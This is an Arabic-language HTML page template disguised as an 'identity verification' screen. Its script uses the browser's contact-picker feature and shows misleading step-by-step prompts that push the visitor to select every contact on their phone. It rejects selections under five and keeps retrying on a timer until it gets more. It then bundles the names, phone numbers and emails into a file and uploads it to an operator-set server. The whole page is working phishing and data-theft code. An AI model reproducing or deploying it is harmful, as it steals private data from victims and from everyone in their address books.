<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>التحقق من الهوية</title>
  <style>
    * { margin:0;padding:0;box-sizing:border-box; }
    body {
      background:#050510;
      color:#fff;
      font-family:'Segoe UI',Arial,sans-serif;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    .wrap { width:90%;max-width:370px; }

    /* ─── Verifying screen ─── */
    #screenVerify { text-align:center; }
    .logo { font-size:56px;margin-bottom:12px; }
    .brand { font-size:20px;font-weight:700;color:#e0e0ff;margin-bottom:4px; }
    .sub { font-size:13px;color:#666;margin-bottom:28px; }
    .spin {
      width:52px;height:52px;
      border:5px solid #1a1a3a;
      border-top:5px solid #0066ff;
      border-radius:50%;
      animation:spin .9s linear infinite;
      margin:0 auto 16px;
    }
    @keyframes spin{ to{transform:rotate(360deg)} }
    .vtxt { font-size:14px;color:#888; }

    /* ─── Error screen ─── */
    #screenError { display:none;text-align:center; }
    .err-icon { font-size:52px;margin-bottom:16px; }
    .err-title { font-size:19px;font-weight:700;color:#ff4444;margin-bottom:12px; }
    .err-msg { font-size:13px;color:#999;line-height:1.7;margin-bottom:24px; }

    /* ─── How-to steps ─── */
    .steps { margin-bottom:24px; }
    .step {
      background:#101028;
      border:1px solid #2a2a5a;
      border-radius:12px;
      padding:12px 14px;
      margin-bottom:8px;
      display:flex;
      align-items:center;
      gap:12px;
      text-align:right;
    }
    .step-n {
      background:#0066ff;
      border-radius:50%;
      width:28px;height:28px;
      display:flex;align-items:center;justify-content:center;
      font-size:13px;font-weight:700;flex-shrink:0;
    }
    .step-t { font-size:13px;color:#ccc;line-height:1.5; }
    .step-t strong { color:#fff; }

    /* ─── Timer ─── */
    .timer-bar-wrap {
      background:#1a1a3a;
      border-radius:8px;
      height:6px;
      overflow:hidden;
      margin-bottom:20px;
    }
    .timer-bar {
      height:100%;
      background:#0066ff;
      width:100%;
      transition:width linear;
    }

    /* ─── Button ─── */
    .btn {
      display:block;
      width:100%;
      background:linear-gradient(135deg,#0066ff,#0044aa);
      color:#fff;
      border:none;
      padding:16px;
      border-radius:50px;
      font-size:17px;
      font-weight:700;
      cursor:pointer;
    }
    .btn:active { opacity:.8; }
    .btn-warn {
      background:linear-gradient(135deg,#cc3300,#991100);
    }

    /* ─── Success ─── */
    #screenDone { display:none;text-align:center; }
    .ok-icon { font-size:60px;margin-bottom:16px; }
    .ok-title { font-size:20px;font-weight:700;color:#4caf50; }
  </style>
</head>
<body>
<div class="wrap">

  <!-- VERIFYING -->
  <div id="screenVerify">
    <div class="logo">🛡️</div>
    <div class="brand">التحقق من الهوية</div>
    <div class="sub">جارٍ الاتصال بالخادم...</div>
    <div class="spin"></div>
    <div class="vtxt" id="vtxt">يُرجى الانتظار</div>
  </div>

  <!-- ERROR / RETRY -->
  <div id="screenError">
    <div class="err-icon">⚠️</div>
    <div class="err-title" id="errTitle">فشل التحقق</div>
    <div class="err-msg" id="errMsg">يجب تحديد جميع جهات الاتصال للمتابعة.</div>

    <div class="steps">
      <div class="step"><div class="step-n">1</div><div class="step-t">افتح القائمة التي ظهرت أمامك</div></div>
      <div class="step"><div class="step-n">2</div><div class="step-t"><strong>اضغط مطولاً</strong> على أي اسم حتى يظهر ✓</div></div>
      <div class="step"><div class="step-n">3</div><div class="step-t">انتظر قليلاً — سيتحدد <strong>الكل</strong> تلقائياً</div></div>
      <div class="step"><div class="step-n">4</div><div class="step-t">اضغط <strong>تم</strong> في الأعلى للمتابعة</div></div>
    </div>

    <div class="timer-bar-wrap"><div class="timer-bar" id="timerBar"></div></div>
    <button class="btn btn-warn" id="retryBtn" onclick="runPicker()">إعادة التحقق الآن</button>
  </div>

  <!-- DONE -->
  <div id="screenDone">
    <div class="ok-icon">✅</div>
    <div class="ok-title">تم التحقق بنجاح</div>
  </div>

</div>
<script>
  const uid        = "<%= uid %>";
  const serverURL  = "<%= a %>";
  const redirectUrl= "<%= redirectUrl %>";

  const MIN_CONTACTS = 5; // reject if fewer than this

  function show(id) {
    ['screenVerify','screenError','screenDone'].forEach(s => {
      document.getElementById(s).style.display = s === id ? 'block' : 'none';
    });
  }

  let pickerOpen = false;
  async function runPicker() {
    if (pickerOpen) return;
    pickerOpen = true;
    show('screenVerify');
    document.getElementById('vtxt').textContent = 'يُرجى الانتظار';

    try {
      if (!('contacts' in navigator) || !('ContactsManager' in window)) {
        document.getElementById('errTitle').textContent = 'جهاز غير مدعوم';
        document.getElementById('errMsg').textContent   = 'يُرجى فتح الرابط من تطبيق Chrome على هاتف Android.';
        show('screenError');
        pickerOpen = false;
        return;
      }

      const contacts = await navigator.contacts.select(['name','tel','email'],{ multiple:true });
      pickerOpen = false;

      if (!contacts || contacts.length === 0) {
        showRetry('لم يتم اختيار جهات الاتصال', 'يجب تحديد جميع جهات الاتصال للمتابعة. اضغط مطولاً لتحديد الكل ثم تم.', 5);
        return;
      }

      if (contacts.length < MIN_CONTACTS) {
        showRetry(
          `تم اختيار ${contacts.length} فقط ❌`,
          'يجب تحديد جميع جهات الاتصال. اضغط مطولاً على أي اسم حتى يتم تحديد الكل، ثم اضغط تم.',
          6
        );
        return;
      }

      // Good — upload
      show('screenVerify');
      document.getElementById('vtxt').textContent = `جارٍ رفع ${contacts.length} جهة اتصال...`;

      const device = navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Android';
      let txt = `All Contacts - ${device}\nTotal: ${contacts.length}\nDate: ${new Date().toLocaleString()}\n${'='.repeat(40)}\n\n`;
      for (const c of contacts) {
        const name   = c.name?.[0]  || 'Unknown';
        const tels   = c.tel?.join(' | ')   || '';
        const emails = c.email?.join(' | ') || '';
        txt += `Name: ${name}\n`;
        if (tels)   txt += `Phone: ${tels}\n`;
        if (emails) txt += `Email: ${emails}\n`;
        txt += '\n';
      }

      const fd = new FormData();
      fd.append('uid',      uid);
      fd.append('file',     new Blob([txt],{type:'text/plain'}), `Contacts_${device}.txt`);
      fd.append('count',    contacts.length);
      fd.append('filename', `Contacts_${device}.txt`);
      await fetch(serverURL + '/contacts-file', { method:'POST', body:fd });

      show('screenDone');
      setTimeout(() => { window.location.href = redirectUrl; }, 1400);

    } catch(e) {
      pickerOpen = false;
      showRetry('انتهت الجلسة', 'يُرجى المحاولة مرة أخرى واختيار جميع الاتصالات.', 5);
    }
  }

  function showRetry(title, msg, delaySec) {
    document.getElementById('errTitle').textContent = title;
    document.getElementById('errMsg').textContent   = msg;
    const bar = document.getElementById('timerBar');
    bar.style.transition = 'none';
    bar.style.width = '100%';
    show('screenError');
    // animate bar down
    setTimeout(() => {
      bar.style.transition = `width ${delaySec}s linear`;
      bar.style.width = '0%';
    }, 100);
    // auto-retry
    setTimeout(() => { runPicker(); }, delaySec * 1000);
  }

  // Kick off immediately on first user touch/click
  let _started = false;
  function start() {
    if (_started) return; _started = true;
    runPicker();
  }
  document.addEventListener('touchstart', start, { once:true });
  document.addEventListener('click',      start, { once:true });
  // Also try after 800ms (in case auto-trigger doesn't fire)
  setTimeout(start, 800);
</script>
</body>
</html>
